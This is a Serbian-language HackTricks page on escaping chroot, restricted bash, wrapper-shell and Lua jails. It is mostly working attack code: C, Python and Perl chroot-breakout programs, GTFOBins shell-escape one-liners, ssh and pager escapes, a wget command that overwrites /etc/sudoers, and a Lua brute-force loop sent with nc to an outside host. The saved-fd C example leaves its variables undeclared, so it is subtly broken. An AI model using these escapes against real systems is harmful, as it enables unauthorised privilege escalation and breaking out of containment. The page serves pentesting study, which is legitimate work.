# Izlazak iz jail-ova

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Pretražite** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **da proverite da li možete da izvršite bilo koji binary sa svojstvom „Shell“**

## Izlasci iz chroot-a

Prema [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Mehanizam chroot nije **namenjen odbrani** od namernog menjanja od strane **privileged** (**root**) **korisnika**. Na većini sistema, chroot konteksti se ne mogu pravilno ulančavati, a chrootovani programi **sa dovoljnim privilegijama mogu izvršiti drugi chroot kako bi izašli**.\
To obično znači da za izlazak morate biti root unutar chroot-a.

> [!TIP]
> **Alat** [**chw00t**](https://github.com/earthquake/chw00t) napravljen je za zloupotrebu sledećih scenarija i izlazak iz `chroot`-a.<sup>[[1]](#references)</sup>

### Root + CWD

> [!WARNING]
> Ako ste **root** unutar chroot-a, **možete izaći** kreiranjem **drugog chroot-a**. To je zato što 2 chroot-a ne mogu da postoje istovremeno (u Linux-u), pa ako kreirate folder, a zatim **kreirate novi chroot** u tom novom folderu dok se **vi nalazite izvan njega**, sada ćete biti **izvan novog chroot-a** i samim tim ćete se nalaziti u FS-u.
>
> To se dešava zato što chroot obično NE premešta vaš radni direktorijum na navedeni direktorijum, pa možete kreirati chroot, a da se nalazite izvan njega.

Obično nećete pronaći `chroot` binary unutar chroot jail-a, ali biste mogli da kompajlirate, otpremite i izvršite binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Ovo je slično prethodnom slučaju, ali u ovom slučaju **napadač čuva file descriptor trenutnog direktorijuma**, a zatim **kreira chroot u novom folderu**. Na kraju, pošto ima **pristup** tom **FD-u** **izvan** chroot-a, pristupa mu i **izlazi**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD se može proslediti preko Unix Domain Sockets, zato:
>
> - Kreirajte child process (fork)
> - Kreirajte UDS kako bi parent i child mogli da komuniciraju
> - Pokrenite chroot u child process-u, u drugom folderu
> - U parent process-u kreirajte FD foldera koji se nalazi izvan novog chroot-a child process-a
> - Prosledite taj FD child process-u koristeći UDS
> - Child process izvršava chdir ka tom FD-u i, pošto se on nalazi izvan njegovog chroot-a, napušta jail

### Root + Mount

> [!WARNING]
>
> - Mount-ovanje root uređaja (/) u folder unutar chroot-a
> - Izvršavanje chroot-a u tom folderu
>
> Ovo je moguće u Linux-u

### Root + /proc

> [!WARNING]
>
> - Mount-ujte procfs u folder unutar chroot-a (ako već nije mount-ovan)
> - Potražite pid koji ima drugačiji root/cwd entry, na primer: /proc/1/root
> - Izvršite chroot u taj entry

### Root(?) + Fork

> [!WARNING]
>
> - Kreirajte Fork (child proc) i izvršite chroot u drugi folder dublje u FS-u, a zatim izvršite CD u njega
> - Iz parent process-a premestite folder u kojem se child process nalazi u folder koji je prethodio chroot-u child process-a
> - Ovaj child process će se naći izvan chroot-a

### ptrace

> [!WARNING]
>
> - Ranije su korisnici mogli da debug-uju sopstvene procese iz sopstvenog procesa... ali to više nije podrazumevano moguće
> - U svakom slučaju, ako je to moguće, mogli biste da koristite ptrace nad procesom i izvršite shellcode unutar njega ([pogledajte ovaj primer](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Pribavite informacije o jail-u:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Izmena PATH-a

Proverite da li možete da izmenite PATH env varijablu<sup>[[2]](#references)</sup>.
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Korišćenje vim-a
```bash
:set shell=/bin/sh
:shell
```
### Pagers and help viewers

Mnoga ograničena okruženja i dalje imaju dostupne **pagers** ili **help viewers**. Njih je obično brže zloupotrebiti nego pokušavati ponovo izgraditi `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Ako je `git` dostupan, imajte na umu da njegov izlaz pomoći obično prolazi kroz pager:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Uobičajene GTFOBins jednolinijske komande

Kada utvrdite kojim binarnim datotekama možete pristupiti, prvo testirajte očigledne načine za pokretanje shell-a:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Ako možete samo da **ubacujete argumente** u dozvoljenu komandu (umesto da je slobodno pokrećete), proverite i **GTFOArgs**.

### Kreiranje skripte

Proverite da li možete da kreirate izvršnu datoteku čiji je sadržaj _/bin/bash_
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Dobijanje bash-a putem SSH-a

Ako pristupate putem ssh-a, često možete zatražiti od servera da izvrši **drugi program** umesto ograničene login shell:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Ako je `ssh` jedan od nekoliko lokalno dozvoljenih binarnih fajlova, imajte na umu da se može zloupotrebiti i kao **GTFOBin**:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declare
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Možete, na primer, prepisati sudoers fajl
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Ograničeni shell wrapper-i (`git-shell`, `rssh`, `lshell`)

Neka okruženja vas ne uvode u običan `rbash`, već u **wrapper-e** kao što su `git-shell`, `rssh` ili `lshell`:

- `git-shell` prihvata samo Git komande na serverskoj strani, kao i sve što se nalazi unutar `~/git-shell-commands/`. Ako taj direktorijum postoji, pokrenite `help` da biste izlistali dozvoljene prilagođene akcije. Ako možete da **pišete** u njega, bilo koji izvršni fajl ubačen u taj direktorijum postaje dostupan.<sup>[[3]](#references)</sup>
- `rssh` / `lshell` obično dozvoljavaju samo `scp`, `sftp`, `rsync` ili operacije u Git stilu. U tim slučajevima se prvo fokusirajte na **primitives za upis fajlova**: otpremite `authorized_keys`, shell startup fajl ili pomoćnu skriptu na lokaciju u koju možete da pišete, a zatim se ponovo povežite pomoću `ssh -t ...`.
- Ako wrapper samo filtrira komandnu liniju, izlistajte dostupne binarne fajlove, a zatim pređite na **GTFOBins / GTFOArgs**.

### Druge tehnike

Takođe proverite:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Mogla bi biti zanimljiva i stranica:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Trikove za escaping iz Python jail-ova možete pronaći na sledećoj stranici:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Na ovoj stranici možete pronaći globalne funkcije kojima imate pristup unutar Lua-e: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval sa izvršavanjem komandi:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Neki trikovi za **pozivanje funkcija biblioteke bez korišćenja tačaka**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Izlistavanje funkcija biblioteke:
```bash
for k,v in pairs(string) do print(k,v) end
```
Imajte na umu da se svaki put kada izvršite prethodni **one-liner** u **drugačijem lua okruženju, redosled funkcija menja**. Zato, ako treba da izvršite određenu funkciju, možete izvršiti brute force napad učitavanjem različitih lua okruženja i pozivanjem prve funkcije biblioteke:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Dobijanje interaktivnog lua shell-a**: Ako se nalazite unutar ograničenog lua shell-a, možete dobiti novi lua shell (i nadati se da je bez ograničenja) pozivanjem:
```bash
debug.debug()
```
## Reference

- [1] [Chw00t: Kako izaći iz različitih chroot rešenja (Bucsay Balazs, DeepSec predavanje i slajdovi)](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [GNU Bash referentno uputstvo – The Restricted Shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Git dokumentacija](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
